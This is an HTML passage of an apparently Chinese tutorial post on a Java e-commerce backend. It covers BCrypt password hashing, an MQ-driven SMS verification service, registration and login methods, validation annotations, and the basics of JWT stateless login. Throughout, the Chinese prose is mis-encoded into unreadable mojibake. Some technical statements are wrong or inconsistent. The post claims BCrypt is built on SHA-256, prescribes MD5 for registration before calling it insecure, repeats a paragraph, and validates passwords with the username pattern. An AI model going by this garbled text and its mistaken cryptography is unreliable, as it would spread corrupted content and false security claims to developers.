class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>å¯†ç åŠ å¯†ï¼š</p>
<p>å¯†ç åŠ å¯†ä½¿ç”¨ä¼ ç»Ÿçš„MD5åŠ å¯†å¹¶ä¸å®‰å…¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯Springæä¾›çš„BCryptPasswordEncoderåŠ å¯†ç®—æ³•ï¼Œåˆ†æˆåŠ å¯†å’ŒéªŒè¯ä¸¤ä¸ªè¿‡ç¨‹ï¼š</p>
<ul>
<li><p>åŠ å¯†ï¼šç®—æ³•ä¼šå¯¹æ˜æ–‡å¯†ç éšæœºç”Ÿæˆä¸€ä¸ªsaltï¼Œä½¿ç”¨saltç»“åˆå¯†ç æ¥åŠ å¯†ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯†æ–‡ã€‚</p>
</li>
<li><p>éªŒè¯å¯†ç ï¼šéœ€è¦å…ˆæ‹¿åˆ°åŠ å¯†åçš„å¯†ç å’Œè¦éªŒè¯çš„å¯†ç ï¼Œæ ¹æ®å·²åŠ å¯†çš„å¯†ç æ¥æ¨æµ‹å‡ºsaltï¼Œç„¶ååˆ©ç”¨ç›¸åŒçš„ç®—æ³•å’Œsaltå¯¹è¦éªŒè¯ç çš„å¯†ç åŠ å¯†ï¼Œä¸å·²åŠ å¯†çš„å¯†ç å¯¹æ¯”å³å¯ã€‚</p>
</li>
</ul>
<p>ä¸ºäº†é˜²æ­¢æœ‰äººèƒ½æ ¹æ®å¯†æ–‡æ¨æµ‹å‡ºsaltï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä½¿ç”¨BCryptPasswordEncoderæ—¶é…ç½®éšå³å¯†é’¥</p>
<h1 id="ç”¨æˆ·ä¸­å¿ƒ"><a href="#ç”¨æˆ·ä¸­å¿ƒ" class="headerlink" title="ç”¨æˆ·ä¸­å¿ƒ"></a>ç”¨æˆ·ä¸­å¿ƒ</h1><h2 id="çŸ­ä¿¡æœåŠ¡"><a href="#çŸ­ä¿¡æœåŠ¡" class="headerlink" title="çŸ­ä¿¡æœåŠ¡"></a>çŸ­ä¿¡æœåŠ¡</h2><p>åœ¨ä»¥å‰ï¼Œæˆ‘ä»¬éƒ½æ˜¯æŠŠå‘é€çŸ­ä¿¡åŠŸèƒ½æŠ½å–ä¸€ä¸ªå·¥å…·ç±»ï¼Œä»»ä½•åœ°æ–¹éœ€è¦ï¼Œç›´æ¥è°ƒç”¨å·¥å…·ç±»å‘é€çŸ­ä¿¡å³å¯ã€‚è¿™æ ·çš„æ–¹å¼å­˜åœ¨ä»¥ä¸‹ç¼ºç‚¹ï¼š</p>
<ul>
<li>å‘é€çŸ­ä¿¡ä»£ç ä¸ä¸šåŠ¡ä»£ç è€¦åˆ</li>
<li>çŸ­ä¿¡å‘é€åŠŸèƒ½ä¼šå½±å“ä¸šåŠ¡åŠŸèƒ½æ‰§è¡Œ</li>
</ul>
<p>å¦‚æœåœ¨ä¸šåŠ¡ä»£ç ä¸­ï¼ŒåµŒå…¥å‘é€çŸ­ä¿¡çš„ä»£ç ï¼Œé‚£å°±æ˜¯åŠŸèƒ½çš„è€¦åˆï¼Œä¸æ–¹ä¾¿åæœŸçš„ç»´æŠ¤ã€‚è€Œä¸”</p>
<p>å› ä¸ºçŸ­ä¿¡å‘é€æ˜¯è°ƒç”¨ç¬¬ä¸‰æ–¹çš„äº‘æœåŠ¡ï¼ŒAPIè°ƒç”¨æˆåŠŸä¸å¦ã€æ‰§è¡Œæ—¶é•¿éƒ½æ˜¯ä¸ç¡®å®šçš„ã€‚å¦‚æœæ‰§è¡Œå‘çŸ­ä¿¡æ—¶ï¼Œå› ä¸ºç½‘ç»œé—®é¢˜å¯¼è‡´é˜»å¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªå·±çš„ä¸šåŠ¡ä¹Ÿä¼šé˜»å¡ã€‚</p>
<p>ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œæé«˜ç¨‹åºçš„å“åº”é€Ÿåº¦ï¼ŒçŸ­ä¿¡å‘é€æˆ‘ä»¬éƒ½å°†é‡‡ç”¨å¼‚æ­¥å‘é€æ–¹å¼ï¼Œå³ï¼š</p>
<ul>
<li>çŸ­ä¿¡æœåŠ¡ç›‘å¬MQæ¶ˆæ¯</li>
<li>æ”¶åˆ°æ¶ˆæ¯åå‘é€çŸ­ä¿¡ï¼Œæ ¹æ®æ¶ˆæ¯<code>routing_key</code>ä¸åŒï¼Œå‘é€ä¸åŒç±»å‹çš„çŸ­ä¿¡</li>
<li>å…¶å®ƒæœåŠ¡è¦å‘é€çŸ­ä¿¡æ—¶ï¼Œé€šè¿‡MQé€šçŸ¥çŸ­ä¿¡å¾®æœåŠ¡ã€‚</li>
</ul>
<h2 id="å‘é€çŸ­ä¿¡åŠŸèƒ½"><a href="#å‘é€çŸ­ä¿¡åŠŸèƒ½" class="headerlink" title="å‘é€çŸ­ä¿¡åŠŸèƒ½"></a>å‘é€çŸ­ä¿¡åŠŸèƒ½</h2><p>ä¸šåŠ¡é€»è¾‘ï¼š</p>
<ul>
<li>1ï¼‰æˆ‘ä»¬æ¥æ”¶é¡µé¢å‘é€æ¥çš„æ‰‹æœºå·ç </li>
<li>2ï¼‰ç”Ÿæˆä¸€ä¸ªéšæœºéªŒè¯ç </li>
<li>3ï¼‰å°†éªŒè¯ç ä¿å­˜åœ¨æœåŠ¡ç«¯ï¼ˆè¦ç”¨redisä»£æ›¿sessionï¼‰(éªŒè¯ç æœ‰ä¸€å®šæœ‰æ•ˆæœŸï¼Œä¸€èˆ¬æ˜¯5åˆ†é’Ÿï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨Redisçš„è¿‡æœŸæœºåˆ¶æ¥ä¿å­˜ã€‚)</li>
<li>4ï¼‰å‘é€çŸ­ä¿¡ï¼Œå°†éªŒè¯ç å‘é€åˆ°ç”¨æˆ·æ‰‹æœºï¼ˆå‘MQå‘é€æ¶ˆæ¯ï¼‰</li>
</ul>
<h2 id="æ³¨å†ŒåŠŸèƒ½"><a href="#æ³¨å†ŒåŠŸèƒ½" class="headerlink" title="æ³¨å†ŒåŠŸèƒ½"></a>æ³¨å†ŒåŠŸèƒ½</h2><p>ç”¨æˆ·é¡µé¢å¡«å†™æ•°æ®ï¼Œå‘é€è¡¨å•åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯å¯¹ç”¨æˆ·è¾“å…¥çš„çŸ­ä¿¡éªŒè¯ç è¿›è¡Œæ ¡éªŒï¼Œå¯¹ç”¨æˆ·æ•°æ®åšæ ¡éªŒï¼Œå¦å¤–è¿˜éœ€è¦å¯¹ç”¨æˆ·å¯†ç è¿›è¡ŒåŠ å¯†å­˜å‚¨ï¼Œä½¿ç”¨MD5åŠ å¯†ï¼ŒåŠ å¯†è¿‡ç¨‹ä¸­ä½¿ç”¨éšæœºç ä½œä¸ºsaltåŠ ç›ï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ul>
<li>éªŒè¯çŸ­ä¿¡éªŒè¯ç </li>
<li>æ ¡éªŒç”¨æˆ·æ•°æ®(å‰ç«¯éªŒè¯ä¸å®‰å…¨,å¯ä»¥é€šè¿‡postmanæäº¤)</li>
<li>å¯¹å¯†ç åŠ å¯†</li>
<li>å†™å…¥æ•°æ®åº“</li>
</ul>
<p>201æ³¨å†ŒæˆåŠŸ, 400å‚æ•°æœ‰è¯¯,500æœåŠ¡å™¨å†…éƒ¨å¼‚å¸¸,æ³¨å†Œå¤±è´¥</p>
<h3 id="å¯†ç åŠ å¯†"><a href="#å¯†ç åŠ å¯†" class="headerlink" title="å¯†ç åŠ å¯†"></a>å¯†ç åŠ å¯†</h3><p>åŸºæœ¬é€»è¾‘ï¼š</p>
<ul>
<li>1ï¼‰æ ¡éªŒçŸ­ä¿¡éªŒè¯ç </li>
<li>2ï¼‰å¯¹å¯†ç åŠ å¯†</li>
<li>3ï¼‰å†™å…¥æ•°æ®åº“</li>
</ul>
<p>å¯†ç åŠ å¯†ï¼š</p>
<p>å¯†ç åŠ å¯†ä½¿ç”¨ä¼ ç»Ÿçš„MD5åŠ å¯†å¹¶ä¸å®‰å…¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯Springæä¾›çš„BCryptPasswordEncoderåŠ å¯†ç®—æ³•ï¼Œåˆ†æˆåŠ å¯†å’ŒéªŒè¯ä¸¤ä¸ªè¿‡ç¨‹ï¼š</p>
<ul>
<li><p>åŠ å¯†ï¼šç®—æ³•ä¼šå¯¹æ˜æ–‡å¯†ç éšæœºç”Ÿæˆä¸€ä¸ªsaltï¼Œä½¿ç”¨saltç»“åˆå¯†ç æ¥åŠ å¯†ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯†æ–‡ã€‚</p>
</li>
<li><p>éªŒè¯å¯†ç ï¼šéœ€è¦å…ˆæ‹¿åˆ°åŠ å¯†åçš„å¯†ç å’Œè¦éªŒè¯çš„å¯†ç ï¼Œæ ¹æ®å·²åŠ å¯†çš„å¯†ç æ¥æ¨æµ‹å‡ºsaltï¼Œç„¶ååˆ©ç”¨ç›¸åŒçš„ç®—æ³•å’Œsaltå¯¹è¦éªŒè¯ç çš„å¯†ç åŠ å¯†ï¼Œä¸å·²åŠ å¯†çš„å¯†ç å¯¹æ¯”å³å¯ã€‚</p>
</li>
</ul>
<p>ä¸ºäº†é˜²æ­¢æœ‰äººèƒ½æ ¹æ®å¯†æ–‡æ¨æµ‹å‡ºsaltï¼Œæˆ‘ä»¬éœ€è¦åœ¨ä½¿ç”¨BCryptPasswordEncoderæ—¶é…ç½®éšæœºå¯†é’¥ï¼Œåœ¨<code>com.leyou.user.config</code>åŒ…ä¸­åˆ›å»ºä¸€ä¸ªé…ç½®ç±»ï¼Œæ³¨å†Œ<code>BCryptPasswordEncoder</code>å¯¹è±¡</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">ly:</span></span><br><span class="line">  <span class="attr">encoder:</span></span><br><span class="line">    <span class="attr">crypt:</span></span><br><span class="line">      <span class="attr">secret:</span> <span class="string">$&#123;random.uuid&#125;</span> <span class="comment"># éšæœºçš„å¯†é’¥ï¼Œä½¿ç”¨uuid</span></span><br><span class="line">      <span class="attr">strength:</span> <span class="number">6</span> <span class="comment"># åŠ å¯†å¼ºåº¦4~31ï¼Œå†³å®šç›åŠ å¯†æ—¶çš„è¿ç®—å¼ºåº¦ï¼Œè¶…è¿‡10ä»¥ååŠ å¯†è€—æ—¶ä¼šæ˜¾è‘—å¢åŠ </span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(User user, String code)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.æ ¡éªŒéªŒè¯ç </span></span><br><span class="line">    <span class="comment">// 1.1 å–å‡ºredisä¸­çš„éªŒè¯ç </span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cacheCode</span> <span class="operator">=</span> redisTemplate.opsForValue().get(KEY_PREFIX + user.getPhone());</span><br><span class="line">    <span class="comment">// 1.2 æ¯”è¾ƒéªŒè¯ç </span></span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.equals(code, cacheCode)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;éªŒè¯ç é”™è¯¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.å¯¹å¯†ç åŠ å¯†</span></span><br><span class="line">    user.setPassword(passwordEncoder.encode(user.getPassword()));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.å†™å…¥æ•°æ®åº“</span></span><br><span class="line">    save(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨"><a href="#ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨" class="headerlink" title="ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨?"></a>ä¸ºä»€ä¹ˆç”¨MD5ä¸å®‰å…¨?</h4><p>MD5åŠ å¯†å¯ä»¥æŸ¥è¡¨;</p>
<h4 id="BCryptPasswordEncoderçš„åŸç†"><a href="#BCryptPasswordEncoderçš„åŸç†" class="headerlink" title="BCryptPasswordEncoderçš„åŸç†"></a>BCryptPasswordEncoderçš„åŸç†</h4><p>SHA-256 +éšæœºç›+å¯†é’¥å¯¹å¯†ç è¿›è¡ŒåŠ å¯†,è¿‡ç¨‹æ˜¯ä¸å¯ä»¥é€†çš„; åŠ å¯†(encode): ç®—å‡ºhashç„¶åå­˜å–æ•°æ®åº“,ç®—æ³•ä¸å¯é€†,å¯†ç å¼ºåº¦è¶…è¿‡10ä¼šå˜æ…¢;  å¯†ç åŒ¹é…(matches): éªŒè¯å¯†ç å’Œhashæœ‰æ²¡æœ‰é—®é¢˜,ç„¶åé€šè¿‡å­˜å…¥æ•°æ®åº“çš„hashè®¡ç®—å‡ºsalt,ç„¶åå†å»åŠ å¯†æ¯”å¯¹;</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022670.png" alt="image.png"></p>
<h2 id="æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ"><a href="#æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ" class="headerlink" title="æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ"></a>æœåŠ¡ç«¯æ•°æ®æ ¡éªŒ</h2><p>ä½¿ç”¨Hibernate-Validator(ç”¨æ³¨è§£çš„æ–¹å¼@Email @Pattern(value) ç­‰)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_REGEX, message &#x3D; â€œç”¨æˆ·åæ ¼å¼ä¸æ­£ç¡®â€)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.USERNAME_REGEX, message &#x3D; â€œå¯†ç æ ¼å¼ä¸æ­£ç¡®â€)</p>
<p>@Pattern(regexp &#x3D; RegexPatterns.PHONE_REGEX, message &#x3D; â€œæ‰‹æœºå·æ ¼å¼ä¸æ­£ç¡®â€)</p>
<h2 id="æ ¹æ®ç”¨æˆ·åå’Œå¯†ç æŸ¥è¯¢ç”¨æˆ·"><a href="#æ ¹æ®ç”¨æˆ·åå’Œå¯†ç æŸ¥è¯¢ç”¨æˆ·" class="headerlink" title="æ ¹æ®ç”¨æˆ·åå’Œå¯†ç æŸ¥è¯¢ç”¨æˆ·"></a>æ ¹æ®ç”¨æˆ·åå’Œå¯†ç æŸ¥è¯¢ç”¨æˆ·</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> UserDTO <span class="title function_">queryUserByPhoneAndPassword</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.æ ¹æ®ç”¨æˆ·åæŸ¥è¯¢</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> getOne(<span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;User&gt;().eq(<span class="string">&quot;username&quot;</span>, username));</span><br><span class="line">    <span class="comment">// 2.åˆ¤æ–­æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">    <span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// ç”¨æˆ·åé”™è¯¯</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3.æ ¡éªŒå¯†ç </span></span><br><span class="line">    <span class="keyword">if</span>(!passwordEncoder.matches(password, user.getPassword()))&#123;</span><br><span class="line">        <span class="comment">// å¯†ç é”™è¯¯</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.è½¬æ¢DTO</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserDTO</span>(user);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="JWTç™»å½•01"><a href="#JWTç™»å½•01" class="headerlink" title="JWTç™»å½•01"></a>JWTç™»å½•01</h1><h2 id="æ— çŠ¶æ€ç™»å½•åŸç†"><a href="#æ— çŠ¶æ€ç™»å½•åŸç†" class="headerlink" title="æ— çŠ¶æ€ç™»å½•åŸç†"></a>æ— çŠ¶æ€ç™»å½•åŸç†</h2><h3 id="ä»€ä¹ˆæ˜¯æœ‰çŠ¶æ€"><a href="#ä»€ä¹ˆæ˜¯æœ‰çŠ¶æ€" class="headerlink" title="ä»€ä¹ˆæ˜¯æœ‰çŠ¶æ€"></a>ä»€ä¹ˆæ˜¯æœ‰çŠ¶æ€</h3><p>æœ‰çŠ¶æ€æœåŠ¡ï¼Œå³æœåŠ¡ç«¯éœ€è¦è®°å½•æ¯æ¬¡ä¼šè¯çš„å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œä»è€Œè¯†åˆ«å®¢æˆ·ç«¯èº«ä»½ï¼Œæ ¹æ®ç”¨æˆ·èº«ä»½è¿›è¡Œè¯·æ±‚çš„å¤„ç†ï¼Œå…¸å‹çš„è®¾è®¡å¦‚tomcatä¸­çš„sessionã€‚</p>
<p>ä¾‹å¦‚ç™»å½•ï¼šç”¨æˆ·ç™»å½•åï¼Œæˆ‘ä»¬æŠŠç™»å½•è€…çš„ä¿¡æ¯ä¿å­˜åœ¨æœåŠ¡ç«¯sessionä¸­ï¼Œå¹¶ä¸”ç»™ç”¨æˆ·ä¸€ä¸ªcookieå€¼ï¼Œè®°å½•å¯¹åº”çš„sessionã€‚ç„¶åä¸‹æ¬¡è¯·æ±‚ï¼Œç”¨æˆ·æºå¸¦cookieå€¼æ¥ï¼Œæˆ‘ä»¬å°±èƒ½è¯†åˆ«åˆ°å¯¹åº”sessionï¼Œä»è€Œæ‰¾åˆ°ç”¨æˆ·çš„ä¿¡æ¯ã€‚</p>
<p>ç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<ul>
<li>æœåŠ¡ç«¯ä¿å­˜å¤§é‡æ•°æ®ï¼Œå¢åŠ æœåŠ¡ç«¯å‹åŠ›</li>
<li>æœåŠ¡ç«¯ä¿å­˜ç”¨æˆ·çŠ¶æ€ï¼Œæ— æ³•è¿›è¡Œæ°´å¹³æ‰©å±•</li>
<li>å®¢æˆ·ç«¯è¯·æ±‚ä¾èµ–æœåŠ¡ç«¯ï¼Œå¤šæ¬¡è¯·æ±‚å¿…é¡»è®¿é—®åŒä¸€å°æœåŠ¡å™¨</li>
</ul>
<h3 id="ä»€ä¹ˆæ˜¯æ— çŠ¶æ€"><a href="#ä»€ä¹ˆæ˜¯æ— çŠ¶æ€" class="headerlink" title="ä»€ä¹ˆæ˜¯æ— çŠ¶æ€"></a>ä»€ä¹ˆæ˜¯æ— çŠ¶æ€</h3><p>å¾®æœåŠ¡é›†ç¾¤ä¸­çš„æ¯ä¸ªæœåŠ¡ï¼Œå¯¹å¤–æä¾›çš„éƒ½æ˜¯Resté£æ ¼çš„æ¥å£ã€‚è€ŒResté£æ ¼çš„ä¸€ä¸ªæœ€é‡è¦çš„è§„èŒƒå°±æ˜¯ï¼šæœåŠ¡çš„æ— çŠ¶æ€æ€§ï¼Œå³ï¼š</p>
<ul>
<li>æœåŠ¡ç«¯ä¸ä¿å­˜ä»»ä½•å®¢æˆ·ç«¯è¯·æ±‚è€…ä¿¡æ¯</li>
<li>å®¢æˆ·ç«¯çš„æ¯æ¬¡è¯·æ±‚å¿…é¡»å…·å¤‡è‡ªæè¿°ä¿¡æ¯ï¼Œé€šè¿‡è¿™äº›ä¿¡æ¯è¯†åˆ«å®¢æˆ·ç«¯èº«ä»½</li>
</ul>
<p>å¸¦æ¥çš„å¥½å¤„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ</p>
<ul>
<li>å®¢æˆ·ç«¯è¯·æ±‚ä¸ä¾èµ–æœåŠ¡ç«¯çš„ä¿¡æ¯ï¼Œä»»ä½•å¤šæ¬¡è¯·æ±‚ä¸éœ€è¦å¿…é¡»è®¿é—®åˆ°åŒä¸€å°æœåŠ¡</li>
<li>æœåŠ¡ç«¯çš„é›†ç¾¤å’ŒçŠ¶æ€å¯¹å®¢æˆ·ç«¯é€æ˜</li>
<li>æœåŠ¡ç«¯å¯ä»¥ä»»æ„çš„è¿ç§»å’Œä¼¸ç¼©</li>
<li>å‡å°æœåŠ¡ç«¯å­˜å‚¨å‹åŠ›</li>
</ul>
<h3 id="å¦‚ä½•å®ç°æ— çŠ¶æ€"><a href="#å¦‚ä½•å®ç°æ— çŠ¶æ€" class="headerlink" title="å¦‚ä½•å®ç°æ— çŠ¶æ€"></a>å¦‚ä½•å®ç°æ— çŠ¶æ€</h3><p>æ— çŠ¶æ€ç™»å½•çš„æµç¨‹ï¼š</p>
<ul>
<li>å½“å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯·æ±‚æœåŠ¡æ—¶ï¼ŒæœåŠ¡ç«¯å¯¹ç”¨æˆ·è¿›è¡Œä¿¡æ¯è®¤è¯ï¼ˆç™»å½•ï¼‰</li>
<li>è®¤è¯é€šè¿‡ï¼Œå°†ç”¨æˆ·ä¿¡æ¯è¿›è¡ŒåŠ å¯†å½¢æˆtokenï¼Œè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä½œä¸ºç™»å½•å‡­è¯</li>
<li>ä»¥åæ¯æ¬¡è¯·æ±‚ï¼Œå®¢æˆ·ç«¯éƒ½æºå¸¦è®¤è¯çš„token</li>
<li>æœåŠ¡çš„å¯¹tokenè¿›è¡Œè§£å¯†ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æ•ˆã€‚</li>
</ul>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022671.png" alt="1527300483893"></p>
<p>æ•´ä¸ªç™»å½•è¿‡ç¨‹ä¸­ï¼Œæœ€å…³é”®çš„ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p><strong>token(twoken)çš„å®‰å…¨æ€§</strong></p>
<p>tokenæ˜¯è¯†åˆ«å®¢æˆ·ç«¯èº«ä»½çš„å”¯ä¸€æ ‡ç¤ºï¼Œå¦‚æœåŠ å¯†ä¸å¤Ÿä¸¥å¯†ï¼Œè¢«äººä¼ªé€ é‚£å°±å®Œè›‹äº†ã€‚</p>
<p>é‡‡ç”¨ä½•ç§æ–¹å¼åŠ å¯†æ‰æ˜¯å®‰å…¨å¯é çš„å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å°†é‡‡ç”¨<code>JWT + RSAéå¯¹ç§°åŠ å¯†</code></p>
<h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>JWTï¼Œå…¨ç§°æ˜¯Json Web Tokenï¼Œ æ˜¯JSONé£æ ¼è½»é‡çº§çš„æˆæƒå’Œèº«ä»½è®¤è¯è§„èŒƒï¼Œå¯å®ç°æ— çŠ¶æ€ã€åˆ†å¸ƒå¼çš„Webåº”ç”¨æˆæƒï¼›</p>
<h4 id="æ•°æ®æ ¼å¼"><a href="#æ•°æ®æ ¼å¼" class="headerlink" title="æ•°æ®æ ¼å¼"></a>æ•°æ®æ ¼å¼</h4><p>JWTåŒ…å«ä¸‰éƒ¨åˆ†æ•°æ®ï¼š</p>
<ul>
<li><p>Headerï¼šå¤´éƒ¨ï¼Œé€šå¸¸å¤´éƒ¨æœ‰ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š</p>
<ul>
<li>tokenç±»å‹ï¼Œè¿™é‡Œæ˜¯JWT</li>
<li>ç­¾åç®—æ³•ï¼Œè‡ªå®šä¹‰</li>
</ul>
<p>æˆ‘ä»¬ä¼šå¯¹å¤´éƒ¨è¿›è¡Œbase64åŠ å¯†ï¼ˆå¯è§£å¯†ï¼‰ï¼Œå¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†æ•°æ®</p>
</li>
<li><p>Payloadï¼šè½½è·ï¼Œå°±æ˜¯æœ‰æ•ˆæ•°æ®ï¼Œä¸€èˆ¬åŒ…å«ä¸‹é¢ä¿¡æ¯ï¼š</p>
<ul>
<li>æ ‡å‡†è½½è·ï¼šJWTè§„å®šçš„ä¿¡æ¯ï¼Œjwtçš„å…ƒæ•°æ®ï¼š<ul>
<li>JTI: JWTçš„idï¼Œå½“å‰jwtçš„å”¯ä¸€æ ‡è¯†ï¼ˆåƒèº«ä»½è¯å·ï¼‰</li>
<li>IAT:  issue at ç­¾å‘æ—¶é—´ </li>
<li>EXPï¼šè¿‡æœŸæ—¶é—´</li>
<li>SUBï¼šç­¾å‘äºº</li>
<li>â€¦</li>
</ul>
</li>
<li>è‡ªå®šä¹‰è½½è·ï¼š<ul>
<li>ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œï¼ˆæ³¨æ„ï¼Œè¿™é‡Œå› ä¸ºé‡‡ç”¨base64åŠ å¯†ï¼Œå¯è§£å¯†ï¼Œå› æ­¤ä¸è¦å­˜æ”¾æ•æ„Ÿä¿¡æ¯ï¼‰</li>
</ul>
</li>
</ul>
<p>è¿™éƒ¨åˆ†ä¹Ÿä¼šé‡‡ç”¨base64åŠ å¯†ï¼Œå¾—åˆ°ç¬¬äºŒéƒ¨åˆ†æ•°æ®</p>
</li>
<li><p>Signatureï¼šç­¾åï¼Œæ˜¯æ•´ä¸ªæ•°æ®çš„è®¤è¯ä¿¡æ¯ã€‚ä¸€èˆ¬æ ¹æ®å‰ä¸¤æ­¥çš„æ•°æ®ï¼Œå†åŠ ä¸ŠæœåŠ¡çš„çš„å¯†é’¥ï¼ˆsecretï¼‰ï¼ˆä¸è¦æ³„æ¼ï¼Œæœ€å¥½å‘¨æœŸæ€§æ›´æ¢ï¼‰ï¼Œé€šè¿‡åŠ å¯†ç®—æ³•ç”Ÿæˆã€‚ç”¨äºéªŒè¯æ•´ä¸ªæ•°æ®å®Œæ•´å’Œå¯é æ€§</p>
</li>
</ul>
<p>ç”Ÿæˆçš„æ•°æ®æ ¼å¼ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022672.png" alt="1527322512370"></p>
<p>å¯ä»¥çœ‹åˆ°åˆ†ä¸º3æ®µï¼Œæ¯æ®µå°±æ˜¯ä¸Šé¢çš„ä¸€éƒ¨åˆ†æ•°æ®</p>
<h4 id="JWTäº¤äº’æµç¨‹"><a href="#JWTäº¤äº’æµç¨‹" class="headerlink" title="JWTäº¤äº’æµç¨‹"></a>JWTäº¤äº’æµç¨‹</h4><p>æµç¨‹å›¾ï¼š</p>
<p>authorize â€“&gt; authorization æˆæƒï¼ˆç™»å½•ï¼‰</p>
<p>authenticate â€“&gt; authentication é‰´æƒ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022673.png" alt="1554558044477"></p>
<ul>
<li>æˆæƒæµç¨‹authorizeï¼š<ul>
<li>1ã€ç”¨æˆ·è¯·æ±‚ç™»å½•ï¼Œæºå¸¦ç”¨æˆ·åå¯†ç åˆ°æˆæƒä¸­å¿ƒ</li>
<li>2ã€æˆæƒä¸­å¿ƒæºå¸¦ç”¨æˆ·åå¯†ç ï¼Œåˆ°ç”¨æˆ·ä¸­å¿ƒæŸ¥è¯¢ç”¨æˆ·</li>
<li>3ã€æŸ¥è¯¢å¦‚æœæ­£ç¡®ï¼Œç”ŸæˆJWTå‡­è¯</li>
<li>4ã€è¿”å›JWTç»™ç”¨æˆ·</li>
</ul>
</li>
<li>é‰´æƒæµç¨‹authenticateï¼š<ul>
<li>1ã€ç”¨æˆ·è¯·æ±‚æŸå¾®æœåŠ¡åŠŸèƒ½ï¼Œæºå¸¦JWT</li>
<li>2ã€å¾®æœåŠ¡å°†jwtäº¤ç»™æˆæƒä¸­å¿ƒæ ¡éªŒ</li>
<li>3ã€æˆæƒä¸­å¿ƒè¿”å›æ ¡éªŒç»“æœåˆ°å¾®æœåŠ¡</li>
<li>4ã€å¾®æœåŠ¡åˆ¤æ–­æ ¡éªŒç»“æœï¼ŒæˆåŠŸæˆ–å¤±è´¥</li>
<li>5ã€å¤±è´¥åˆ™ç›´æ¥è¿”å›401</li>
<li>6ã€æˆåŠŸåˆ™å¤„ç†ä¸šåŠ¡å¹¶è¿”å›</li>
</ul>
</li>
</ul>
<p>å› ä¸ºJWTç­¾å‘çš„tokenä¸­å·²ç»åŒ…å«äº†ç”¨æˆ·çš„ä¿¡æ¯ï¼Œå¹¶ä¸”æ¯æ¬¡è¯·æ±‚éƒ½ä¼šæºå¸¦ï¼Œè¿™æ ·æœåŠ¡å°±æ— éœ€ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œç”šè‡³æ— éœ€å»æ•°æ®åº“æŸ¥è¯¢ï¼Œå®Œå…¨ç¬¦åˆäº†Restçš„æ— çŠ¶æ€è§„èŒƒã€‚</p>
<p>ä¸è¿‡ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯ä¸æ˜¯å°±å®Œç¾äº†å‘¢ï¼Ÿ</p>
